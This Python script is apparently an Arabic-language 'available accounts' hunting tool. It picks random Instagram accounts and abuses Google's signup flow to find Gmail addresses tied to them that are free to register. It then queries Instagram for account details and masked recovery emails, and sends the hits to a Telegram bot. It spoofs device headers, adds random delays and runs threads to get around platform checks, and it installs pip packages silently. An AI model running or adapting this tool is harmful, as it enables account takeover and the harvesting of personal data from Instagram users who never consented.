import os
import re
import json
import uuid
import time
import random
import string
import secrets
import base64
import requests
import httpx
from concurrent.futures import ThreadPoolExecutor
from os import system as S, name as N

# ============ odaislib للجلب ============
try:
    from odaislib import instagram
except ImportError:
    S("pip install odaislib")
    from odaislib import instagram

try:
    import requests
except ImportError:
    S("pip install requests")
    import requests
    S("cls" if N == "nt" else "clear")

try:
    import user_agent
except ImportError:
    S("pip install user_agent")
    import user_agent
    S("cls" if N == "nt" else "clear")

E = '\033[1;31m'
G = '\033[1;35m'
Z = '\033[1;31m'
X = '\033[1;33m'
Z1 = '\033[2;31m'
F = '\033[2;32m'
A = '\033[2;34m'
C = '\033[2;35m'
B = '\x1b[38;5;208m'
Y = '\033[1;34m'
M = '\x1b[1;37m'
S = '\033[1;33m'
U = '\x1b[1;37m'

hit = 0
go = 0
bm = 0
ig = 0
bg = 0
email = ""

print(f'''{B}{E}=============================={B}
|{F}[+] YouTube    : {B}|أحمد الحراني 
|{F}[+] TeleGram  : {B} @maho_s9    |
|{F}[+] Instagram  : {B} grq5 |
|{F}[+] Tool  : {B} متاحات Instagram |
{E}==============================''')

TOKENTLE = input(f' {F}({C}1{F}) {Y} 𝐄𝐧𝐭𝐞𝐫 𝐓𝐨𝐤𝐞𝐧{F}  : ' + Z)
print(X + ' ═════════════════════════════════  ')
IDF = input(f' {F}({C}2{F}) {Y} 𝐄𝐧𝐭𝐞𝐫 𝐈𝐃{F} : ' + Z)
print(X + ' ═════════════════════════════════  ')


def PLAY():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f'''━━━━━━━━━━━━━━━━━━━━━━━━━
[0] Dev : @maho_s9 | Instagram  Free Tool
━━━━━━━━━━━━━━━━━━━━━━━━━
{F} [1] {F} {F}HIT  -  تم الصيد    » 「{hit}」
━━━━━━━━━━━━━━━━━━━━━━━━━
{B} [2] {B}Available IG - متاح   » 「{ig}」
━━━━━━━━━━━━━━━━━━━━━━━━━
{Z} [3] {Z} {Z}BAD IG - مش متاح   » 「{bg}」
━━━━━━━━━━━━━━━━━━━━━━━━━
{A} [4] {A} {A}Good GM - جيميل صح » 「{go}」
━━━━━━━━━━━━━━━━━━━━━━━━━
{X} [5] {X} {X}BAD GM - ايميل خاطئ   » 「{bm}」
━━━━━━━━━━━━━━━━━━━━━━━━━
{U} [6] {U} {U}email  » 「{email}」| 
━━━━━━━━━━━━━━━━━━━━━━━━━''')


# ==================== دالة الريست المدمجة ====================
def extract_email_from_text(response_text: str) -> str:
    """تصفية الرد واستخراج البريد الإلكتروني المسرّب فقط"""
    match = re.search(r"[a-zA-Z0-9_\.\*]+@[a-zA-Z0-9_\.\*]+\.[a-zA-Z0-9_\.\*]+", response_text)
    if match:
        return match.group(0)
    return None


def get_rest_email(user_input: str) -> str:
    """إرسال الطلب لإنستغرام لاستخراج البريد المخفي"""
    time.sleep(random.uniform(1.5, 3.5))
    url = "https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.search.async/"
    payload = {
        "search_query": user_input,
        "bloks_versioning_id": "dbfb0f84b6481f4ec0a033d7947fb45db546b8cee18dde220c4c1eefd3bb3dcb",
    }
    headers = {
        "User-Agent": "Instagram 368.0.0.45.96 Android (30/11; 440dpi; 1080x2220; Xiaomi/Redmi; 23127PN0CC; begonia; mt6785; ar_EG; 700073482)",
        "Connection": "Keep-Alive",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "x-bloks-version-id": "dbfb0f84b6481f4ec0a033d7947fb45db546b8cee18dde220c4c1eefd3bb3dcb",
        "x-ig-app-id": "567067343352427",
    }
    try:
        response = requests.post(url, data=payload, headers=headers, timeout=15)
        if response.status_code == 200:
            extracted = extract_email_from_text(response.text)
            return extracted if extracted else "Nothing To Rest"
        else:
            return "Nothing To Rest"
    except Exception:
        return "Nothing To Rest"
# ================================================================


class RestInsta:
    @staticmethod
    def Rest(user):
        return {"email": get_rest_email(user)}


class InfoIG:
    """جلب معلومات إنستغرام عبر odaislib — لا sessionid، لا http2"""

    @staticmethod
    def _get_date(Id):
        """تقدير سنة الحساب من الـ ID"""
        try:
            Id = int(Id)
            if 1 < Id <= 1278889: return 2010
            elif 1279000 <= Id <= 17750000: return 2011
            elif 17750001 <= Id <= 279760000: return 2012
            elif 279760001 <= Id <= 900990000: return 2013
            elif 900990001 <= Id <= 1629010000: return 2014
            elif 1629010001 <= Id <= 2369359761: return 2015
            elif 2369359762 <= Id <= 4239516754: return 2016
            elif 4239516755 <= Id <= 6345108209: return 2017
         #   elif 6345108210 <= Id <= 10016232395: return 2018
          #  elif 10016232396 <= Id <= 27238602159: return 2019
           # elif 27238602160 <= Id <= 43464475395: return 2020
      #      elif 43464475396 <= Id <= 50289297647: return 2021
          #  elif 50289297648 <= Id <= 57464707082: return 2022
            elif 57464707083 <= Id <= 63313426938: return 2023
            else: return "2024 or 2025"
        except:
            return None

    @staticmethod
    def Instagram_Info(user):
        """الواجهة الموحّدة — تستخدمها SenD_IG"""
        try:
            data = instagram.info(user)

            if not isinstance(data, dict):
                return {'Username': user, 'status': 'error',
                        'Source': 'odaislib', 'By': '@maho_s9'}

            if data.get('status') != 'success':
                return {'Username': user, 'status': 'error',
                        'Source': 'odaislib', 'By': '@maho_s9'}

            acc_id = data.get('id', 0)

            return {
                'Username':   data.get('username', user),
                'Name':       data.get('full_name', ''),
                'ID':         acc_id,
                'Followers':  data.get('followers', ''),
                'Following':  data.get('following', ''),
                'Bio':        '',          # odaislib لا تُعيد bio
                'Posts':      data.get('posts', ''),
                'Image':      data.get('profile_pic', ''),
                'Is Private': data.get('private', ''),
                'Date':       InfoIG._get_date(acc_id),
                'Source':     'odaislib',
                'status':     'ok',
                'By':         '@maho_s9'
            }

        except Exception as e:
            return {'Username': user, 'status': 'error',
                    'Source': 'odaislib',
                    'error': str(e),
                    'By': '@maho_s9'}


def SenD_IG(email):
    global hit
    user = email.split("@")[0]
    hit += 1

    # الريست
    rest = RestInsta.Rest(user)["email"]

    # الجلب عبر odaislib
    inf = InfoIG.Instagram_Info(user)
    name = inf.get("Name", "")
    Id = inf.get("ID", "")
    fols = inf.get("Followers", "")
    folg = inf.get("Following", "")
    bio = inf.get("Bio", "")
    po = inf.get("Posts", "")
    pr = inf.get("Is Private", "")
    date = inf.get("Date", "")

    tlg = f'''
⋘─────━*AHMED*━─────⋙
[🇾🇪] Hits ==> {hit}
[💌] Email ==> {email}
[💬] Email Rest ==> {rest}
[👻] Username ==> @{user}
[👱🏻] Name ==> {name}
[🔺] ID ==> {Id}
[🔁] Followers ==> {fols}
[🔂] Following ==> {folg}
[📺] Bio ==> {bio}
[💯] Date ==> {date}
[🎥] Posts ==> {po}
[📲] Is Private ==> {pr}
[↩️] URL ==> https://www.instagram.com/{user}
⋘─────━❤️🌚━─────⋙
𝐁𝐘 : @maho_s9 
'''
    print('\033[2;32m' + tlg)
    try:
        requests.post(f"https://api.telegram.org/bot{TOKENTLE}/sendMessage?chat_id={IDF}&text={tlg}")
    except Exception as e:
        print(f"Telegram Error: {e}")

    with open('hits_Insta.txt', 'a', encoding="utf-8") as f:
        f.write(tlg + '\n')
    PLAY()


class Gmail:
    def __init__(self):
        self.session = requests.session()
        self.tl = None
        self.atSNlM0e = None

    def get_tokens(self):
        while True:
            self.session.headers.clear()
            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'en-US,en;q=0.9', 'referer': 'https://accounts.google.com/', 'upgrade-insecure-requests': '1', 'user-agent': str(user_agent.generate_user_agent()), 'x-browser-channel': 'stable', 'x-browser-copyright': 'Copyright 2024 Google LLC. All rights reserved.', 'x-browser-year': '2024'}
            params = {'biz': 'false', 'continue': 'https://mail.google.com/mail/u/0/', 'ddm': '1', 'emr': '1', 'flowEntry': 'SignUp', 'flowName': 'GlifWebSignIn', 'followup': 'https://mail.google.com/mail/u/0/', 'osid': '1', 'service': 'mail'}
            try:
                r = self.session.get('https://accounts.google.com/lifecycle/flows/signup', params=params, headers=headers)
                self.tl = r.url.split('TL=')[1]
                Qzxixc = r.text.split('"Qzxixc":"')[1].split('"')[0]
                self.atSNlM0e = r.text.split('"SNlM0e":"')[1].split('"')[0]
                self.session.headers.update({'accept': '*/*', 'accept-language': 'en-US,en;q=0.9', 'content-type': 'application/x-www-form-urlencoded;charset=UTF-8', 'origin': 'https://accounts.google.com', 'referer': 'https://accounts.google.com/', 'user-agent': str(user_agent.generate_user_agent()), 'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]', 'x-goog-ext-391502476-jspb': '["' + Qzxixc + '"]', 'x-same-domain': '1'})
                break
            except:
                pass

    def signupName(self):
        while True:
            if not self.tl and not self.atSNlM0e:
                self.get_tokens()
            params = {'rpcids': 'E815hb', 'source-path': '/lifecycle/steps/signup/name', 'hl': 'en-US', 'TL': self.tl, 'rt': 'c'}
            data = 'f.req=%5B%5B%5B%22E815hb%22%2C%22%5B%5C%22{}%5C%22%2C%5C%22%5C%22%2Cnull%2Cnull%2Cnull%2C%5B%5D%2C%5B%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2C%5C%22mail%5C%22%5D%2C1%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for i in range(random.randrange(5, 10))), self.atSNlM0e)
            try:
                r = self.session.post('https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute', params=params, data=data).text
                if "steps/signup/birthdaygender" in r: break
                else: continue
            except: pass

    def signupBirthday(self):
        while True:
            if not self.tl and not self.atSNlM0e:
                self.get_tokens()
            params = {'rpcids': 'eOY7Bb', 'source-path': '/lifecycle/steps/signup/birthdaygender', 'hl': 'en-US', 'TL': self.tl, 'rt': 'c'}
            data = 'f.req=%5B%5B%5B%22eOY7Bb%22%2C%22%5B%5B{}%2C{}%2C{}%5D%2C1%2Cnull%2Cnull%2Cnull%2Cnull%2C%5Bnull%2Cnull%2C%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5C%22mail%5C%22%5D%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(random.randrange(1990,2007),random.randrange(1,12),random.randrange(1,28),self.atSNlM0e)
            try:
                r = self.session.post('https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute', params=params, data=data).text
                if 'steps/signup/username' in r: break
                else: continue
            except: pass

    def signupEmail(self, email):
        global go, bm
        if '@' in email: em = email.split('@')[0]
        else: em = email
        if '..' in email or '_' in email or len(email) < 5 or len(email) > 30: return False
        if not self.tl and not self.atSNlM0e: self.get_tokens()
        self.signupName()
        self.signupBirthday()
        params = {'rpcids': 'NHJMOd', 'source-path': '/lifecycle/steps/signup/username', 'hl': 'en-US', 'TL': self.tl, 'rt': 'c'}
        data = 'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{}%5C%22%2C0%2C0%2Cnull%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C152855%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(em, self.atSNlM0e)
        try:
            r = self.session.post('https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute', params=params, data=data).text
            if "steps/signup/password" in r:
                go += 1
                PLAY()
                Insta._check1(email)
            else:
                bm += 1
                PLAY()
        except: pass


class Insta:
    @staticmethod
    def _check1(email):
        global ig, bg
        try:
            response = httpx.Client(http2=True, timeout=30).post(
                "https://i.instagram.com/api/v1/users/check_email/",
                data=f"email={email}",
                headers={
                    'User-Agent': "Instagram 166.0.0.30.120 Android (30/11; 1440dpi; 2560x1440; samsung; SM-G973F; x86_64; tablet; en_US; kirin)",
                    'content-type': "application/x-www-form-urlencoded; charset=UTF-8"
                }
            )
            if 'email_is_taken' in response.text:
                ig += 1
                PLAY()
                SenD_IG(email)
            elif '"available":true' in response.text:
                bg += 1
                PLAY()
            else:
                Insta._check2(email)
        except Exception as e:
            print(e)

    @staticmethod
    def _check2(email):
        global ig, bg
        try:
            d = f"android-{''.join(random.choices(string.hexdigits.lower(), k=16))}"
            m = str(uuid.uuid4())
            q = str(uuid.uuid4())
            payload = {
                'method': "post", 'format': "json", 'server_timestamps': "true", 'locale': "user", 'purpose': "fetch",
                'fb_api_req_friendly_name': "IGBloksAppRootQuery-com.bloks.www.bloks.caa.reg.async.contactpoint_email.async",
                'client_doc_id': "356548512611906258864738750706", 'enable_canonical_naming': "true",
                'enable_canonical_variable_overrides': "true", 'enable_canonical_naming_ambiguous_type_prefixing': "true",
                'variables': json.dumps({
                    "params": {
                        "params": json.dumps({
                            "params": json.dumps({
                                "client_input_params": {
                                    "aac": json.dumps({"aac_init_timestamp": int(time.time()), "aacjid": str(uuid.uuid4()), "aaccs": "".join(random.choices(string.ascii_letters + string.digits, k=40))}, separators=(',', ':')),
                                    "device_id": d, "zero_balance_state": "", "network_bssid": None, "msg_previous_cp": "", "email_token": "",
                                    "switch_cp_first_time_loading": 1, "has_rejected_rel": 0, "seen_login_upsell": 0,
                                    "accounts_list": [{"uid": str(random.randint(10**9, 10**10)), "credential_type": "none", "token": ""}, {"token": "", "account_type": "google_oauth", "credential_type": "google_oauth"}],
                                    "email_prefilled": 0, "confirmed_cp_and_code": {}, "family_device_id": m, "block_store_machine_id": "", "fb_ig_device_id": [],
                                    "lois_settings": {"lois_token": ""}, "cloud_trust_token": None, "is_from_device_emails": 0, "email": email, "switch_cp_have_seen_suma": 0
                                },
                                "server_params": {
                                    "event_request_id": str(uuid.uuid4()), "is_from_logged_out": 0, "text_input_id": f"enyn03:{random.randint(10, 99)}", "layered_homepage_experiment_group": None,
                                    "device_id": d, "login_surface": "one_click_login", "waterfall_id": str(uuid.uuid4()), "INTERNAL__latency_qpl_instance_id": random.randint(10**13, 10**14),
                                    "flow_info": json.dumps({"flow_name": "new_to_family_ig_default", "flow_type": "ntf"}, separators=(',', ':')), "is_platform_login": 0,
                                    "login_entry_point": "logged_out", "INTERNAL__latency_qpl_marker_id": random.randint(10**7, 10**8), "reg_info": "{}", "family_device_id": m,
                                    "offline_experiment_group": "caa_iteration_v3_perf_ig_4", "cp_funnel": 0, "cp_source": 0, "access_flow_version": "pre_mt_behavior",
                                    "is_from_logged_in_switcher": 0, "current_step": 0, "qe_device_id": q
                                }
                            }, separators=(',', ':'))
                        }, separators=(',', ':')),
                        "bloks_versioning_id": "cd9dab6073153a9f827d566c759c87b5110f8a64fa8ca0fed8566f013a623f79",
                        "infra_params": {"device_id": q}, "app_id": "com.bloks.www.bloks.caa.reg.async.contactpoint_email.async"
                    },
                    "bk_context": {"is_flipper_enabled": False, "theme_params": [], "debug_tooling_metadata_token": None}
                }, separators=(',', ':'))
            }
            headers = {
                'User-Agent': f"Instagram 438.0.0.28.88 Android ({random.choice(['10/29', '11/30', '12/31', '13/33', '14/34'])}; {random.choice(['420dpi', '450dpi', '480dpi', '560dpi'])}; {random.choice(['1080x2316', '1440x3088', '1080x2400', '1440x3120'])}; {random.choice(['samsung; SM-S918B; dm3; exynos2200', 'samsung; SM-G998B; o1s; exynos2100', 'google; Pixel 7 Pro; cheetah; gs201', 'xiaomi; 23127PN0CC; houji; snapdragon8gen3'])}; {random.choice(['ar_YE', 'en_US', 'en_GB'])}; {random.randint(1017398461, 1017550000)})",
                'accept-language': "ar-YE, en-US", 'priority': "u=3, i", 'x-bloks-version-id': "cd9dab6073153a9f827d566c759c87b5110f8a64fa8ca0fed8566f013a623f79",
                'x-client-doc-id': "356548512611906258864738750706", 'x-fb-client-ip': "True",
                'x-fb-friendly-name': "IGBloksAppRootQuery-com.bloks.www.bloks.caa.reg.async.contactpoint_email.async",
                'x-fb-server-cluster': "True", 'x-ig-android-id': d, 'x-ig-app-id': "567067343352427", 'x-ig-app-locale': "ar_YE",
                'x-ig-capabilities': "3brTv10=", 'x-ig-device-id': m, 'x-ig-device-locale': "ar_YE", 'x-ig-is-foldable': "false",
                'x-ig-mapped-locale': "ar_AR", 'x-ig-timezone-offset': "10800", 'x-ig-validate-null-in-legacy-dict': "true",
                'x-root-field-name': "bloks_action", 'x-tigon-is-retry': "False", 'x-zero-balance': "INIT",
                'x-fb-http-engine': "Tigon/MNS/TCP", 'x-graphql-client-library': "pando", 'x-graphql-request-purpose': "fetch",
                'zero-http-network-interface': "cellular"
            }
            response = requests.post("https://i.instagram.com/graphql_www", data=payload, headers=headers, timeout=30).text
            if "account_recovery" in response:
                ig += 1
                PLAY()
                SenD_IG(email)
            else:
                bg += 1
                PLAY()
        except Exception as e:
            print(e)


class InstaList:
    def __init__(self):
        self.threads = 5   # خفّضناها من 50 إلى 5 بسبب odaislib

    def search(self):
        global email
        while True:
            try:
                payload = {
                    'jazoest': "2" + ''.join(random.choices(string.digits, k=4)),
                    'lsd': "m" + base64.urlsafe_b64encode(secrets.token_bytes(19)).decode().rstrip("="),
                    '__crn': 'comet.igweb.PolarisExploreSearchRoute', 'fb_api_caller_class': 'RelayModern',
                    'fb_api_req_friendly_name': 'PolarisProfilePageContentQuery', 'server_timestamps': 'true',
                    'variables': json.dumps({
                        "enable_integrity_filters": True, "id": str(random.randint(1000, 41734413450)),
                        "__relay_internal__pv__PolarisCannesGuardianExperienceEnabledrelayprovider": True,
                        "__relay_internal__pv__PolarisCASB976ProfileEnabledrelayprovider": False,
                        "__relay_internal__pv__PolarisWebSchoolsEnabledrelayprovider": False,
                        "__relay_internal__pv__PolarisRepostsConsumptionEnabledrelayprovider": True,
                        "__relay_internal__pv__PolarisShortDramaEnabledrelayprovider": False,
                        "__relay_internal__pv__PolarisLongformEnabledrelayprovider": False
                    }, separators=(',', ':')),
                    'doc_id': '38611279431804694'
                }
                headers = {
                    'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36",
                    'x-csrftoken': base64.urlsafe_b64encode(secrets.token_bytes(24)).decode().rstrip("="),
                    'x-fb-friendly-name': "PolarisProfilePageContentQuery", 'x-ig-app-id': "1217981644879628",
                    'x-asbd-id': "359341", 'x-fb-lsd': payload["lsd"], 'origin': "https://www.instagram.com",
                    'sec-fetch-site': "same-origin", 'sec-fetch-mode': "cors", 'sec-fetch-dest': "empty",
                    'accept-language': "en-US", 'priority': "u=1, i",
                }
                user = requests.post("https://www.instagram.com/api/graphql", data=payload, headers=headers).json()['data']['user']['username']
                email = user + "@gmail.com"
                Gmail().signupEmail(email=email)
            except Exception:
                pass

    def run(self):
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            for _ in range(self.threads):
                executor.submit(self.search)


if __name__ == "__main__":
    InstaList().run()
